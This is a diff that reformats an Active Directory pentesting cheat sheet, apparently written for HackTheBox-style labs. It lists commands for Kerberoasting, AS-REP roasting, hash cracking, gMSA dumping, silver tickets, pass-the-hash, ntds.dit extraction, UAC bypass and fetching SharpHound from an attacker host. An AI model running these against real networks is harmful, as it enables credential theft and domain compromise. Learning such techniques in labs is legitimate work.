@@ -1,5 +1,5 @@
 =================================== 
-# PORTS
+PORTS
 
 53 Simple DNS Plus - DNS is usually UDP, but sometimes TCP is needed for large packets
 9389 MC-NMF .Net Message Framing - Active Directory Management Gateway Service
@@ -22,14 +22,14 @@
 
 
 =================================== 
-# Hacktricks
+Hacktricks
 
-- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
-- https://book.hacktricks.xyz/windows/active-directory-methodology 
-- DNS 53 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
-- KRB 88 https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
-- RPC 135 https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
-- LDAP 389,636,3268,3269 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
+https://book.hacktricks.xyz/windows/active-directory-methodology 
+DNS 53 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
+KRB 88 https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
+RPC 135 https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
+LDAP 389,636,3268,3269 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
 
 
 ===================================
@@ -64,7 +64,7 @@ nmap --script=dns-zone-transfer -p 53 ns2.mike.com
 
 
 ===================================
-### AD Entry Scenario - 1
+AD Entry Scenario - 1
 
 - SMB open-share
 - Find and crack 'Groups.xml'
@@ -84,7 +84,7 @@ GetUserSPNs.py -request mike.com/SVC
 
 
 ===================================
-### AD Entry Scenario - 2 
+AD Entry Scenario - 2 
 
 - Query LDAP w/o creds.
 - Find Comments with Password
@@ -102,7 +102,7 @@ pxexec.py administrator@mike.com
 
 
 ===================================
-### AD Entry Scenario -3 
+AD Entry Scenario -3 
 
 - Get in with Upload Vuln
 - Exploit service running as system
@@ -132,7 +132,7 @@ psexec administrator@10.129.97.56 -hashes aadc123:abc123
 
 
 ===================================
-# Hunting with NO creds
+Hunting with NO creds
 
 RPC
 
@@ -203,7 +203,6 @@ ldapsearch -v -x -D bob@mike.com -w paxxword -b "DC=mike,DC=com" -H "ldap://10.1
 
 ===================================
 LDAP Beautiful Results to HTML
-  
 
 ldapdomaindump -u 'htb.local\bob' -p paxxword 10.129.97.56 -o ~/lab/ldap/ 
 firefox ~/lab/ldap/domain_users.html  
@@ -212,7 +211,7 @@ firefox ~/lab/ldap/domain_computers.html
 
 
 ===================================
-# Hunt for Usernames
+Hunt for Usernames
 
 Find usernames in Samba Docs
 
@@ -275,8 +274,7 @@ evil-winrm -i 10.10.10.161 -u svc-admin -p paxxword
 
 
 ===================================
-# TOOLS
-
+TOOLS
 
 cd ~\tools\AD\
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
@@ -295,31 +293,30 @@ python3 -m http.server 80
 powershell wget 192.168.49.124/SharpHound.exe -O SharpHound.exe
 
 
-
 ===================================
 Quick-Roast (requires creds)
 Need credentials for a domain user/service 
-
 
 echo "10.129.97.56 mike.com" >> /etc/hosts  
 GetUserSPNs.py -request domain/SVC_TGS  
 GetUserSPNs.py -request domain/bob:pass -dc-ip 10.129.97.56 -outputfile kbroast.txt 
 
 
-
 ===================================
 GMSA User Crack 
+
 gMSADumper.py -u 'mike' -p paxxword -d mydom.htb     ..remote pull, with user/creds
 GMSAPasswordReader.exe --accountname svc_apache      ..target connected acct able to read gmsa
 
+
 ===================================
 Silver Ticket 
+
 getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$
 
  
 ===================================
 ASREP Roastable Users (no creds needed)
-
 
 GetNPUsers.py domain/bob
 GetNPUsers.py domain/ -no-pass -usersfile userlist.txt  
@@ -346,7 +343,7 @@ psexec.py active.htb/administrator@10.10.10.100
 
 
 ===================================
-# Invoke-Kerberoast.ps1  - Hailmary
+Invoke-Kerberoast.ps1  - Hailmary
 
 Requires an admin/login on an AD box (you used mimikatz, right?) 
 Don't need the actual administrator Password.
@@ -379,7 +376,7 @@ hashcat -m 13100 -a 0 khash0.txt $rockyou --force
 
 
 ===================================
-# Got Creds
+Got Creds
 
 Lookup Usernnames
 lookupsid.py mike.com/bob:"paxxword1\!"@10.129.97.56
@@ -407,7 +404,6 @@ wmiexec mike.com/administrator@10.129.97.56 -hashes abc123:abc123
 
 =================================== 
 Bloodhound 
-
 
 cd C:\Windows\Temp  
 copy \\10.10.16.135\share\SharpHound.exe  
@@ -440,7 +436,7 @@ PS> klist
 PS> PsExec.exe \\mydc cmd.exe
   
 ===================================
-# Port 88 Internal Only - Chisel and Roast
+Port 88 Internal Only - Chisel and Roast
 
 
 netstat -ap tcp
@@ -453,24 +449,22 @@ Got the Kerberoast Hash
 
  
 ===================================
-# Domain Enums with PowerView 
-
+Domain Enums with PowerView 
 
 powershell.exe -nop -exec bypass
 Import-Module .\PowerView.ps1  
 
-
-### Roast 
+Roast 
 Invoke-Sharefinder 
 Invoke-Kerberoast  
 Invoke-BypassUAC  
   
-### Users 
+Users 
 Get-NetUser | select cn  
 Get-NetUser | select cn, objectsid, adspath  
 Get-NetUser -UserName Admin2  
   
-### Computers   
+Computers   
 Get-NetComputer 
 Get-NetComputer -Ping 
 Get-NetComputer -fulldata 
@@ -482,14 +476,14 @@ Invoke-EnumerationLocalAdmin
 Get-NetLoggedon -ComputerName Domain-Controller.dc.local 
 Get-NetRDPSEssion -ComputerName Domain-Controller.dc.local 
   
-### Groups   
+Groups   
 Get-NetGroup  
 Get-NetGroup -Domain dc.local 
 Get-NetGroup -AdminCount 
 Get-NetGroup -UserName JohnAdmin 
 Get-NetGroupMember -GroupName "Administrators" 
   
-### Domain 
+Domain 
 Get-NetDomain 
 Get-DomainSID 
 Get-DomainPolicy 
@@ -498,10 +492,9 @@ Get-NetGPO
   
   
 ===================================  
-# AD/Domain  
+AD/Domain  
   
-### Powerview  
-
+Powerview  
 powershell.exe -nop -exec bypass  
 Import-Module .\PowerView.ps1  
 Get-NetLoggedon -ComputerName client251   
@@ -511,7 +504,7 @@ Invoke-BypassUAC
 
 
 ===================================
-# PWN
+PWN
 
 evil-winrm -i 10.129.97.56 -u administrator -p paxxword
 secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
